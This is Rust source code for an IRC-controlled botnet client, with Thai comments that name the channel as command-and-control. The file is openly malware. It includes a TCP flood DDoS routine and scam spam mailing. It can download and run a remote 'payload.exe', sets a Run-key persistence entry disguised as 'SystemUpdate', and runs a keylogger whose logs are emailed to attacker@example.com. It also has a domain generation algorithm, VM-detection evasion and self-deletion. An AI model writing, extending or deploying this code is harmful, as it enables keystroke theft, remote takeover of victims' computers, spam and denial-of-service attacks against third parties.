use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;
use lettre::{Message, AsyncTransport, Tokio1Executor, AsyncSmtpTransport};
use lettre::message::header::ContentType;
use lettre::transport::smtp::authentication::Credentials;
use irc::client::prelude::*;
use futures::stream::StreamExt;
use std::error::Error;
use std::time::Duration;
use tokio::time::sleep;
use lazy_static::lazy_static;
use std::sync::Mutex;
use rdev::{listen, Event, EventType};
use chrono::{Datelike, Utc};
use rand::{Rng, SeedableRng, rngs::StdRng};
use sha3::{Digest, Sha3_256};

const IRC_SERVER: &str = "irc.example.com";      // เปลี่ยนเป็น IRC server ของเรา
const IRC_NICK: &str = "zombie_bot";
const IRC_CHANNEL: &str = "#c2_channel";         // ช่อง C2
const SMTP_SERVER: &str = "smtp.gmail.com";      // หรือ server อื่น
const SMTP_USER: &str = "bot@gmail.com";
const SMTP_PASS: &str = "app_password_here";

lazy_static! {
    static ref KEYLOGS: Mutex<String> = Mutex::new(String::new());
}

fn start_socks5_proxy(_port: u16) {
    println!("SOCKS5 Proxy not implemented in this version");
}

async fn spam_email(target: String, count: u32) -> Result<(), Box<dyn Error + Send + Sync>> {
    let creds = Credentials::new(SMTP_USER.to_string(), SMTP_PASS.to_string());
    let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(SMTP_SERVER)?
        .credentials(creds)
        .build();

    let email = Message::builder()
        .from(SMTP_USER.parse()?)
        .to(target.parse()?)
        .subject("Important Notification")
        .header(ContentType::TEXT_PLAIN)
        .body("You won $1,000,000! Click here...".to_string())?;

    for _ in 0..count {
        let _ = mailer.send(email.clone()).await;
        sleep(Duration::from_millis(500)).await; // avoid rate limit
    }
    Ok(())
}

async fn irc_c2() -> Result<(), Box<dyn Error + Send + Sync>> {
    let config = Config {
        nickname: Some(IRC_NICK.to_string()),
        server: Some(IRC_SERVER.to_string()),
        channels: vec![IRC_CHANNEL.to_string()],
        ..Default::default()
    };

    let mut client = Client::from_config(config).await?;
    client.identify()?;

    let mut stream = client.stream()?;

    while let Some(result) = stream.next().await {
        let message = result?;
        if let Command::PRIVMSG(channel, msg) = message.command {
            if channel == IRC_CHANNEL && msg.starts_with("!cmd ") {
                let cmd = msg.trim_start_matches("!cmd ").to_string();
                execute_command(cmd).await?;
            }
        }
    }
    Ok(())
}

async fn execute_command(cmd: String) -> Result<(), Box<dyn Error + Send + Sync>> {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    match parts[0] {
        "ddos" if parts.len() >= 4 => {
            // !cmd ddos example.com 80 60
            let target = parts[1].to_string();
            let port: u16 = parts[2].parse()?;
            let duration: u64 = parts[3].parse()?;
            tokio::spawn(ddos_attack(target, port, duration));
        }
        "spam" if parts.len() >= 3 => {
            let target = parts[1].to_string();
            let count: u32 = parts[2].parse()?;
            tokio::spawn(spam_email(target, count));
        }
        "proxy" if parts.len() >= 2 => {
            let port: u16 = parts[1].parse()?;
            start_socks5_proxy(port);
        }
        "download" if parts.len() >= 2 => {
            let url = parts[1].to_string();
            let resp = reqwest::get(&url).await?.bytes().await?;
            std::fs::write("payload.exe", resp)?;
            std::process::Command::new("payload.exe").spawn()?;
        }
        "mine" => {
            tokio::spawn(start_mining());
        }
        "keylog" => {
            start_keylogger();
        }
        "exfil" => {
            tokio::spawn(async {
                if let Err(e) = exfil_keylogs().await {
                    eprintln!("Exfil error: {}", e);
                }
            });
        }
        "dga" => {
            let domains = generate_dga_domains();
            println!("Generated C2 domains: {:?}", domains);
        }
        "antivm" => {
            let is_vm = check_anti_vm().await;
            println!("VM detected: {}", is_vm);
        }
        "selfdelete" => {
            tokio::spawn(self_delete());
        }
        _ => println!("Unknown command: {}", cmd),
    }
    Ok(())
}

async fn ddos_attack(target: String, port: u16, duration: u64) {
    let end = tokio::time::Instant::now() + Duration::from_secs(duration);
    let junk = vec![0u8; 1024];

    while tokio::time::Instant::now() < end {
        if let Ok(mut stream) = TcpStream::connect((target.as_str(), port)).await {
            let _ = stream.write_all(&junk).await;
        }
        tokio::task::yield_now().await;
    }
}

async fn persistence() {
    #[cfg(windows)]
    {
        use winreg::enums::*;
        use winreg::RegKey;
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let path = std::env::current_exe().unwrap();
        let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").unwrap();
        key.set_value("SystemUpdate", &path.to_str().unwrap()).ok();
    }
}

async fn start_mining() {
    loop {
        let input: [u8; 32] = rand::random();
        let mut hasher = Sha3_256::new();
        hasher.update(input);
        let hash = hasher.finalize();
        println!("Mining hash: {:?}", hash);
        sleep(Duration::from_millis(100)).await;
    }
}

fn start_keylogger() {
    std::thread::spawn(|| {
        let callback = |event: Event| {
            if let EventType::KeyPress(key) = event.event_type {
                if let Ok(mut logs) = KEYLOGS.lock() {
                    logs.push_str(&format!("{:?} ", key));
                }
            }
        };
        if let Err(e) = listen(callback) {
            eprintln!("Keylogger error: {:?}", e);
        }
    });
}

async fn exfil_keylogs() -> Result<(), Box<dyn Error + Send + Sync>> {
    let logs = tokio::task::spawn_blocking(|| {
        KEYLOGS.lock().unwrap().clone()
    }).await.unwrap();
    if !logs.is_empty() {
        let creds = Credentials::new(SMTP_USER.to_string(), SMTP_PASS.to_string());
        let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(SMTP_SERVER)?
            .credentials(creds)
            .build();
        let email = Message::builder()
            .from(SMTP_USER.parse()?)
            .to("attacker@example.com".parse()?)
            .subject("Keylogs")
            .header(ContentType::TEXT_PLAIN)
            .body(logs)?;
        mailer.send(email).await?;
        tokio::task::spawn_blocking(|| {
            KEYLOGS.lock().unwrap().clear();
        }).await.unwrap();
    }
    Ok(())
}

fn generate_dga_domains() -> Vec<String> {
    let mut domains = Vec::new();
    let date = Utc::now().date_naive();
    let seed_str = format!("{}{}{}", date.year(), date.month(), date.day());
    let seed_bytes = seed_str.as_bytes();
    let mut seed = [0u8; 32];
    for (i, &b) in seed_bytes.iter().enumerate() {
        if i < 32 {
            seed[i] = b;
        }
    }
    let mut rng = StdRng::from_seed(seed);
    for _ in 0..10 {
        let len = rng.gen_range(5..15);
        let domain: String = (0..len).map(|_| rng.sample(rand::distributions::Alphanumeric) as char).collect();
        domains.push(format!("{}.com", domain.to_lowercase()));
    }
    domains
}

async fn check_anti_vm() -> bool {
    let mut system = sysinfo::System::new_all();
    system.refresh_all();
    for process in system.processes().values() {
        let name = process.name().to_string().to_lowercase();
        if name.contains("vmware") || name.contains("virtualbox") || name.contains("vbox") {
            return true;
        }
    }
    #[cfg(windows)]
    {
        use winreg::RegKey;
        let hklm = RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE);
        if hklm.open_subkey("SOFTWARE\\VMware, Inc.\\VMware Tools").is_ok() ||
           hklm.open_subkey("SOFTWARE\\Oracle\\VirtualBox Guest Additions").is_ok() {
            return true;
        }
    }
    false
}

async fn self_delete() {
    #[cfg(windows)]
    {
        let exe_path = std::env::current_exe().unwrap();
        let cmd = format!("cmd /c ping 127.0.0.1 -n 3 > nul && del \"{}\"", exe_path.display());
        std::process::Command::new("cmd").arg("/c").arg(cmd).spawn().ok();
        std::process::exit(0);
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
    persistence().await;

    tokio::select! {
        _ = irc_c2() => {},
        _ = tokio::signal::ctrl_c() => {},
    }

    Ok(())
}